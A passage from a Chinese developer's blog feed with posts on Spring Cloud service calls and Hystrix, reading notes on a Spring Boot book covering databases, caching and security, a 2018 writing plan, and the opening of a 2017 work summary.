<p>可以通过<a href="http://localhost/users" target="_blank" rel="noopener">http://localhost/users</a> ， <a href="http://localhost/users/123" target="_blank" rel="noopener">http://localhost/users/123</a> 之类的方式访问。</p>
<p>通过以下3种方式调用其他服务对外暴露的接口：</p>
<ul>
<li>JavaScript：前端直接调用</li>
<li>RestTemplate：后端调用</li>
<li>FeignClient：特殊方式</li>
</ul>
<p>以RestTemplate为例说明一个服务调用data服务的例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span> <span class="meta">@LoadBalanced</span></span><br><span class="line">RestTemplate restTemplate;</span><br><span class="line"><span class="meta">@HystrixCommand</span>(fallbackMethod = <span class="string">"getUserFallback"</span>)</span><br><span class="line"> <span class="function"><span class="keyword">public</span> User <span class="title">getUserByName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">	 Map&lt;String, Object&gt; params = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	 params.put(<span class="string">"name"</span>, name);</span><br><span class="line">	 User user = restTemplate.getForObject(<span class="string">"http://data/user/findByName?name=&#123;name&#125;"</span>, User.class, params);</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面例子中使用了@HystrixCommand用于实现断路器，当一个系统服务突然出现故障时，会自动阻断对服务的访问和调用，转而调用备用方法。</p>
<h5 id="监控服务"><a href="#监控服务" class="headerlink" title="监控服务"></a>监控服务</h5><p>分布式服务系统中运行着很多服务，必须有一个管理机制和方法，能够一目了然地随时了解各个服务的运行情况及其健康指数。</p>
<p>使用Spring Cloud的监控服务，可以实时监控应用的运行情况。使用很简单，引入spring-cloud-starter-hystrix-dashboard依赖，创建一个主程序即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@EnableHystrixDashboard</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HystrixApplication</span></span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">home</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"forward:/hystrix"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(HystrixApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体监控指标可参看官网文档。</p>
<h4 id="构建高性能的服务平台"><a href="#构建高性能的服务平台" class="headerlink" title="构建高性能的服务平台"></a>构建高性能的服务平台</h4><p>使用Spring Cloud开发的微服务，其独立而又相对隔离的特性，与Docker的理念有异曲同工之妙，所以使用Docker发布微服务，能够发挥其最大的优势，并且可以非常轻易地构建一个高性能和高可用的服务平台。</p>
<p>Docker可以很方便地创建和管理镜像，以及管理已经生成的和正在运行的容器。镜像是一种文件存储方式，可以把许多文件做成一个镜像文件。容器是镜像运行的一个实例，运行一个镜像，就会生成一个容器，容器生成之后，就可以在容器中管理应用系统了。</p>
<p>Docker的安装和发布服务，网上的资料很多，这里就不赘述了。</p>
<p>另外，可以使用其他一些服务管理工具来构建高性能和高可用的服务平台。docker-compose工具是Docker容器管理工具集，可以很方便地用来创建和重建容器、执行启动和停止容器等管理操作，以及查看整个服务体系的运行情况和输出日志等。使用docker-compose工具，只要一条指令就能启动整个分布式服务体系。</p>
<blockquote>
<p>通过本篇文章的介绍，大家可以感受到Spring Cloud在构建分布式应用时提供的便捷性，减少了大量的工作量。同时为我们考虑了方方面面，增强了系统的稳定性、高性能。<br>作者把所有代码都上传到github，大家可以直接运行demo深入了解。<br>[1] Spring Boot SSO：<a href="https://github.com/chenfromsz/spring-boot-sso" target="_blank" rel="noopener">https://github.com/chenfromsz/spring-boot-sso</a><br>[2] 云应用开发：<a href="https://github.com/chenfromsz/spring-boot-cloud" target="_blank" rel="noopener">https://github.com/chenfromsz/spring-boot-cloud</a></p>
</blockquote>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring boot </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[《深入实践Spring Boot》阅读笔记之一：基础应用开发]]></title>
      <url>https://qqdong.github.io/2018/02/19/%E6%B7%B1%E5%85%A5%E5%AE%9E%E8%B7%B5Spring%20Boot-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/</url>
      <content type="html"><![CDATA[<p>上上篇「1718总结与计划」中提到，18年要对部分项目拆分，进行服务化，并对代码进行重构。公司技术委员会也推荐使用spring boot，之前在各个技术网站中也了解过，它可以大大简化spring配置和各个组件的使用，与其关系密切的Spring Cloud可以很好支持微服务的开发。</p>
<p>为了后续项目的应用，想利用这2天看下《深入实践Spring Boot》，这本书是17年双十一期间在京东上买的，一直懒着没看。这本书偏应用，适合初学者看，正文内容也就240多页，看的会比较轻松。</p>
<p>目前，看完了第一部分，约占全书1/2内容，计划初七上班前看完这本书。我会分3篇文章进行介绍，这篇文章首先介绍下这本书的整体结构，然后总结下第一部分的内容。</p>
<p>我不会介绍具体的实现过程，只是把这本书想要讲的内容串起来，重点说明下我认为重要的内容。想深入了解的，可以直接看这本书，也可以通过文中的一些概念搜索相关的文章阅读。</p>
<a id="more"></a>
<h4 id="书籍整体结构"><a href="#书籍整体结构" class="headerlink" title="书籍整体结构"></a>书籍整体结构</h4><p>Spring Boot 是在Spring框架基础上创建的一个全新框架，其设计目的是简化Spring应用的搭建和开发过程，不但具有Spring的所有优秀特性，而且具有如下显著特点：</p>
<ul>
<li>为Spring开发提供更加简单的使用和快速开发的技巧；</li>
<li>具有开箱即用的默认配置功能，能根据项目依赖自动配置；</li>
<li>具有功能更加强大的服务体系，包括嵌入式服务、安全、性能指标、监控检查等；</li>
<li>可以不再需要XML配置，让应用更加轻巧和灵活； </li>
</ul>
<p>2014年4月发布了1.0.0版本，目前有2个版本，v1最新版本为v1.5.10，v2最新版本为v2.0.0.RC1。</p>
<p>本书从技术、实践和原理3个维度对Spring Boot进行了系统且深入的讲解，作者由浅入深逐步带我们了解Spring Boot。</p>
<h5 id="第一部分-技术维度"><a href="#第一部分-技术维度" class="headerlink" title="第一部分 - 技术维度"></a>第一部分 - 技术维度</h5><p>针对性地介绍了Spring Boot入门、数据库的使用和访问性能提升、界面设计、安全设计等重要技术知识，以实用性为主，帮助我们快速掌握Spring Boot开发方法和精髓，尽快融入生产实践中。</p>
<h5 id="第二部分-实践维度"><a href="#第二部分-实践维度" class="headerlink" title="第二部分 - 实践维度"></a>第二部分 - 实践维度</h5><p>用生产环境中的实际案例讲解如何使用Spring Boot开发分布式应用和云应用，以及如何用微服务构建高可用的服务平台。</p>
<h5 id="第三部分-原理维度"><a href="#第三部分-原理维度" class="headerlink" title="第三部分 - 原理维度"></a>第三部分 - 原理维度</h5><p>从源码层面着重分析了Spring Boot的程序加载、自动配置、数据管理、S<br>pring Cloud的配置管理、发现服务和负载均衡服务等核心功能的实现原理，帮助我们更深刻理解Spring Boot开发，掌握其精髓。</p>
<blockquote>
<p>很喜欢作者的章节安排，以后学习新技术时，可以按照这个思路去学习。 </p>
</blockquote>
<h4 id="Spring-Boot入门"><a href="#Spring-Boot入门" class="headerlink" title="Spring Boot入门"></a>Spring Boot入门</h4><p>本章主要介绍开发环境的配置，包括安装JDK，安装IDEA、安装Maven、安装Git客户端，创建了一个简单的项目，演示如何使用Spring Boot。</p>
<h5 id="使用Spring-Initializr创建项目"><a href="#使用Spring-Initializr创建项目" class="headerlink" title="使用Spring Initializr创建项目"></a>使用Spring Initializr创建项目</h5><p>IDEA提供了可视化的界面创建各种类型的项目，可以通过Spring Initializr的方式，按要求创建Spring Boot项目。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15190424636299.jpg" alt="Spring Initializr"></p>
<h5 id="一个简单demo"><a href="#一个简单demo" class="headerlink" title="一个简单demo"></a>一个简单demo</h5><p>项目创建完成后，会生成一个入口Applicaton类，进行如下的修改，就可提供reset接口，供使用者访问。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookPart1Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping</span>(<span class="string">"/"</span>)</span><br><span class="line">	<span class="function">String <span class="title">home</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SpringApplication.run(BookPart1Application.class, args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="运行与发布"><a href="#运行与发布" class="headerlink" title="运行与发布"></a>运行与发布</h5><p>运行Spring Boot项目很简单，像普通项目一样直接运行即可。</p>
<p>如果要发布到线上Tomcat容器中，需要增加一个打包插件:spring-boot-maven-plugin，通过mvn package打包即可。</p>
<h5 id="Spring-Boot配置"><a href="#Spring-Boot配置" class="headerlink" title="Spring Boot配置"></a>Spring Boot配置</h5><p>可以在工程的resources文件夹中创建一个application.properties或application.yml文件，该文件会被发布在classpath中，被Spring Boot自动读取。 作者推荐使用application.yml文件，因为它提供结构化及其嵌套的格式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  tomcat:</span><br><span class="line">    uri-encoding: UTF-8</span><br><span class="line">  port: 80</span><br></pre></td></tr></table></figure>
<h4 id="使用数据库"><a href="#使用数据库" class="headerlink" title="使用数据库"></a>使用数据库</h4><p>使用数据库是开发基本应用的基础，Spring Boot 提供更加高层次上访问数据库。本章通过介绍使用MySQL、Redis、MongoDB、Neo4j来说明Spring Boot提供的便捷性。</p>
<h5 id="使用MySQL"><a href="#使用MySQL" class="headerlink" title="使用MySQL"></a>使用MySQL</h5><p>对于传统关系型数据库来说，Spring Boot使用JPA资源库来实现对数据库的操作，JPA是为POJO提供持久化的标准规范，即将Java的普通对象通过对象关系映射持久化到数据库中。</p>
<p>作者通过「实体建模」-&gt; 「实体持久化」-&gt; 「测试程序」的思路介绍MySQL的使用。</p>
<p>实体建模是通过注解描述与数据库的对应关系，包括实体的属性、实体之间的关系。<br><img src="http://oc3r3rke2.bkt.clouddn.com/15190456204109.jpg" alt=""></p>
<p>实体持久化是Spring Data提供的强大功能，通过继承于JPA资源库JpaRepository接口，就可以对数据库进行增删改查、分页查询和指定排序的字段等操作，不需要自己实现。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">JpaRepository</span>&lt;<span class="title">T</span>, <span class="title">ID</span> <span class="keyword">extends</span> <span class="title">Serializable</span>&gt; <span class="keyword">extends</span> <span class="title">PagingAndSortingRepository</span>&lt;<span class="title">T</span>, <span class="title">ID</span>&gt;, <span class="title">QueryByExampleExecutor</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">List&lt;T&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;T&gt; <span class="title">findAll</span><span class="params">(Sort var1)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;T&gt; <span class="title">findAll</span><span class="params">(Iterable&lt;ID&gt; var1)</span></span>;</span><br><span class="line"></span><br><span class="line">    &lt;S extends T&gt; <span class="function">List&lt;S&gt; <span class="title">save</span><span class="params">(Iterable&lt;S&gt; var1)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">flush</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    &lt;S extends T&gt; <span class="function">S <span class="title">saveAndFlush</span><span class="params">(S var1)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteInBatch</span><span class="params">(Iterable&lt;T&gt; var1)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteAllInBatch</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">T <span class="title">getOne</span><span class="params">(ID var1)</span></span>;</span><br><span class="line"></span><br><span class="line">    &lt;S extends T&gt; <span class="function">List&lt;S&gt; <span class="title">findAll</span><span class="params">(Example&lt;S&gt; var1)</span></span>;</span><br><span class="line"></span><br><span class="line">    &lt;S extends T&gt; <span class="function">List&lt;S&gt; <span class="title">findAll</span><span class="params">(Example&lt;S&gt; var1, Sort var2)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JPA还提供了一些自定义声明方法的规则，这些方法也不用实现，JPA将会代理实现这些方法，十分方便。</p>
<h5 id="使用Redis"><a href="#使用Redis" class="headerlink" title="使用Redis"></a>使用Redis</h5><p>Redis没有表结构的概念，所以要实现MySQL数据库表的数据在Redis中存取，必须做一些转换，可以使用JSON格式的文本作为Redis与Java普通对象互相交换数据的存储格式。</p>
<p>通过RedisTemplate可以很方便的操作Redis。</p>
<p>对于Redis的使用，还可以将注解方式（@Cacheable、@CachePut、@CacheEvict）与调用数据库的方法相结合，就不用编写redis操作服务类了，使用起来也更简单。不过只能对简单对象进行相关操作，对于想实体User包含一定关系的复杂对象，或其他集合、列表对象，就不能使用简单注解方式来实现，还得使用RedisTemplate。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RoleService</span> </span>&#123; </span><br><span class="line">    <span class="meta">@Autowired</span> </span><br><span class="line">    <span class="keyword">private</span> RoleRepository roleRepository;</span><br><span class="line">    <span class="meta">@Autowired</span> </span><br><span class="line">    <span class="keyword">private</span> RoleRedis roleRedis;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Cacheable</span>(value = <span class="string">"mysql:findById:role"</span>, keyGenerator = <span class="string">"simpleKey"</span>) </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Role <span class="title">findById</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> roleRepository.findOne(id);</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="meta">@CachePut</span>(value = <span class="string">"mysql:findById:role"</span>, keyGenerator = <span class="string">"objectId"</span>) </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Role <span class="title">create</span><span class="params">(Role role)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> roleRepository.save(role);</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="meta">@CachePut</span>(value = <span class="string">"mysql:findById:role"</span>, keyGenerator = <span class="string">"objectId"</span>) </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Role <span class="title">update</span><span class="params">(Role role)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> roleRepository.save(role);</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="meta">@CacheEvict</span>(value = <span class="string">"mysql:findById:role"</span>, keyGenerator = <span class="string">"simpleKey"</span>) </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        roleRepository.delete(id);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用MongoDB"><a href="#使用MongoDB" class="headerlink" title="使用MongoDB"></a>使用MongoDB</h5><p>MongoDB是文档型的NoSQL数据库，具有大数据量、高并发等优势，但缺点是不能建立实体关系，而且也没有事务管理机制。</p>
<p>MongoDB 也有像使用JPA那样的资源库，引入spring-data-mongodb和spring-boot-starter-hateoas依赖库，这里就不过多介绍了。</p>
<h5 id="使用Neo4j"><a href="#使用Neo4j" class="headerlink" title="使用Neo4j"></a>使用Neo4j</h5><p>Neo4j是一个高性能的NoSQL图数据库，并且具备完全事务特性，同时具备传统关系型数据库的优点，又具备NOSQL数据库优势。</p>
<p>Neo4j将结构化数据存储在一张图上，图中每一个节点的属性表示数据的内容，每一条有向边表示数据的关系。它没有表结构的概念，它的数据用节点的属性来表示。</p>
<p>举个例子，现在有演员和电影两个实体，它们的关系表现为一个演员在一部电影中扮演一个角色。那么就可以创建演员和电影两个节点实体，和一个角色关系实体。<br><img src="http://oc3r3rke2.bkt.clouddn.com/15190491796642.jpg" alt="Neo4j举例"></p>
<p>它更加形象和贴切地表现了实体之间的关系，而且这个实体-关系模型是可以不经过任何转换而直接存入数据库的，这将很大程度上减轻设计工作和沟通成本。</p>
<p>像JPA使用了ORM一样，Neo4j使用了对象-图形映射OGM的方式来建模。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RelationshipEntity</span>(type = <span class="string">"ACTS_IN"</span>) </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Role</span> </span>&#123; </span><br><span class="line">    <span class="meta">@GraphId</span> </span><br><span class="line">    Long id;</span><br><span class="line">    String role;</span><br><span class="line">    <span class="meta">@StartNode</span> </span><br><span class="line">    Actor actor;</span><br><span class="line">    <span class="meta">@EndNode</span> </span><br><span class="line">    Movie movie;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Role</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Role</span><span class="params">(Actor actor, Movie movie, String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.actor = actor;</span><br><span class="line">        <span class="keyword">this</span>.movie = movie;</span><br><span class="line">        <span class="keyword">this</span>.role = name;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>从上面的介绍可以看出，在Spring Boot框架中使用数据库非常简单、容易，主要得益于Spring Boot资源库的强大功能，Spring Boot整合了第三方资源，把复杂的操作变成简单的调用。</p>
</blockquote>
<h4 id="界面设计"><a href="#界面设计" class="headerlink" title="界面设计"></a>界面设计</h4><p>本章使用Spring Boot框架设计Web显示界面，使用MVC的概念将数据管理、事件控制、界面显示进行分层处理，实现多层结构设计。使用过MVC框架的比较好理解，这里就不过多说明了。</p>
<p>其中界面显示使用Thymeleaf模板，之前没接触过，简单说明下。Thymeleaf是现代化服务器端的Java模板引擎，不同与JSP和FreeMarker，Thymeleaf的语法更加接近HTML，并且也有不错的扩展性。</p>
<h4 id="提高数据库访问性能"><a href="#提高数据库访问性能" class="headerlink" title="提高数据库访问性能"></a>提高数据库访问性能</h4><p>使用关系型数据库的应用系统的性能瓶颈最终还是数据库。本章通过以下几种方式提高数据库访问性能:</p>
<ul>
<li>使用Druid</li>
<li>扩展JPA功能</li>
<li>使用Redis做缓存</li>
</ul>
<h5 id="使用Druid"><a href="#使用Druid" class="headerlink" title="使用Druid"></a>使用Druid</h5><p>Druid是一个关系型数据库连接池，是阿里巴巴的一个开源项目，在监控、可扩展性、稳定性和性能方面具有明显的优势。通过使用Druid连接池，可以一定程度上提高数据库的访问性能。</p>
<h5 id="扩展JPA功能"><a href="#扩展JPA功能" class="headerlink" title="扩展JPA功能"></a>扩展JPA功能</h5><p>使用JPA，在资源库接口定义中不但可以按照其规则约定的方法声明各种方法，还可以使用注解@Query来定义一些简单的查询语句，优化SQL语句。</p>
<p>可以通过自定义一个接口，继承于JpaRepository，扩展已有的JPA接口。自定义接口必须在程序启动时装配，才能正常使用。然后，在JPA配置类中，通过@EnableJpaRepositories加载定义的装配类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">ExpandJpaRepository</span>&lt;<span class="title">User</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"select t from User t where t.name =?1 and t.email =?2"</span>)</span><br><span class="line">    <span class="function">User <span class="title">findByNameAndEmail</span><span class="params">(String name, String email)</span></span>;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"select t from User t where t.name like :name"</span>)</span><br><span class="line">    <span class="function">Page&lt;User&gt; <span class="title">findByName</span><span class="params">(@Param(<span class="string">"name"</span>)</span> String name, Pageable pageRequest)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用Redis做缓存"><a href="#使用Redis做缓存" class="headerlink" title="使用Redis做缓存"></a>使用Redis做缓存</h5><p>前面「使用Redis」已经介绍。</p>
<h4 id="安全设计"><a href="#安全设计" class="headerlink" title="安全设计"></a>安全设计</h4><p>Web应用的安全管理，主要包括两个方面的内容：一方面是用户身份验证，即用户登录的设计；另一方面是用户授权，即一个用户在一个应用系统中能够执行哪些操作的权限管理。</p>
<p>权限管理的设计一般使用角色来管理，给一个用户赋予哪些角色，用户就具有哪些权限。本章主要使用spring-cloud-security来进行安全管理设计。</p>
<p>使用时，需要继承spring-cloud-starter-parent，并引入spring-cloud-starter-security依赖。</p>
<p>关于系统的安全管理及各种设计，Spring Security已经大体上都实现了，只需要进行一些配置和引用，就能够正常使用了。具体实现就不在此重复描述了。</p>
<blockquote>
<p>好多实现细节，我没有展现出来，一方面会显得篇幅太长，主次不鲜明，另一方面作者把所有代码都放到github了（<a href="https://github.com/chenfromsz?tab=repositories" target="_blank" rel="noopener">http://github.com/chenfromsz</a>）。<br>后续在公司项目中实践好，我再谈谈自己的使用经验。</p>
</blockquote>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring boot </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2018年公众号文章计划]]></title>
      <url>https://qqdong.github.io/2018/02/18/2018%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E8%AE%A1%E5%88%92/</url>
      <content type="html"><![CDATA[<p>18年，无论是工作还是生活，都将更忙，今年是很关键的一年。</p>
<p>公司业务发展迅猛，对人才的培养也很重视，自己要跟上公司的步伐，在技术和管理上更进一步。</p>
<p>为了充分利用业余时间，把平时看视频、无意义的熬夜时间，用在「写公众号文章」，将自己的技术学习、业务实现进行总结、分享，让自己更充实，更有动力。</p>
<p>书上得来终觉浅，将学习的技术与业务实现相结合，相互促进。</p>
<p>希望大家关注我，给我一些动力，18年一起进步。</p>
<a id="more"></a>
<h4 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h4><p>18年想对一些技术深入研究，当然，都是与项目相关的技术，会介绍在实际项目中的应用。</p>
<p>会更加关注团队管理和协作，有意识地去学习相关知识，向身边优秀的同事学习。</p>
<p>下面从技术、业务实现、团队协作列举将要写的内容。</p>
<h5 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h5><ul>
<li>CAS 单点登录</li>
<li>Shiro 权限控制</li>
<li>多线程开发</li>
<li>Spring Boot 实践</li>
<li>Netty 源码探究</li>
</ul>
<h5 id="业务实现"><a href="#业务实现" class="headerlink" title="业务实现"></a>业务实现</h5><ul>
<li>分布式会话实现（多系统）</li>
<li>多语言实现</li>
<li>多租户多时区实现</li>
<li>消息平台实现</li>
<li>项目重构和服务化</li>
</ul>
<h5 id="团队协作"><a href="#团队协作" class="headerlink" title="团队协作"></a>团队协作</h5><ul>
<li>编码规范</li>
<li>代码review</li>
<li>工作流规范推进</li>
<li>团队沟通和协作     </li>
</ul>
<h4 id="执行方案"><a href="#执行方案" class="headerlink" title="执行方案"></a>执行方案</h4><p>有想法就迈出了第一步，希望自己能够坚持执行，执行过程中要遵从基本的原则，规划好时间。</p>
<h5 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h5><ul>
<li>学习的技术要与项目相关，一方面使项目更好的完成，一方面加深对相关技术的理解；</li>
<li>以公司项目为重心，全身心投入，利用空余时间学习、总结相关技术，编写公众号文章；</li>
<li>一定要尽最大努力保证文章质量，让自己满意；</li>
</ul>
<h5 id="时间规划"><a href="#时间规划" class="headerlink" title="时间规划"></a>时间规划</h5><p>18年初，我的小孩要出生了，将会投入许多时间。16年底，我报了人大在职研究生，周六还要去上课。    </p>
<p>平时应该少看电视视频，多锻炼，保持持好精神状态。   </p>
<p>希望自己能做到：</p>
<ul>
<li>每周至少产出一篇文章，特殊情况除外；</li>
<li>每天晚上、周六日，抽出时间学习、总结相关技术；</li>
</ul>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> summary </category>
            
        </categories>
        
        
        <tags>
            
            <tag> plan </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[1718总结与计划]]></title>
      <url>https://qqdong.github.io/2018/02/16/summary-2018/</url>
      <content type="html"><![CDATA[<p>2018年已经悄然到来，回望过去一年，收获很多，感恩很多。未来一年，内心充满了期待，无论是工作还是生活，将会发生很大变化。大年初一的晚上，将自己的所思所想记录下来，与大家分享，激励自己18年更努力。</p>
<h4 id="17年总结"><a href="#17年总结" class="headerlink" title="17年总结"></a>17年总结</h4><p>我目前就职于小米，在『小米网智能客服项目』从事开发工作，项目主要包含在线客服、智能机器人、智能数据分析三大块，另外还包括热线、邮件、工单等模块。    </p>
<p>16年3月份，我加入这个团队，当时就4个人，每个人负责多个子项目。经过了解，项目初期想做的功能很多，设计的比较大，很多人投入进来，形成了很多个子服务。所以17年上半年之前，我一直在维护项目，解决线上的一些问题，实现业务的一些小需求。另外，当时小米的管理比较扁平化，项目管理和团队管理也不是很规范，自己也比较松散，技术和团队协作能力提升的都比较少。</p>
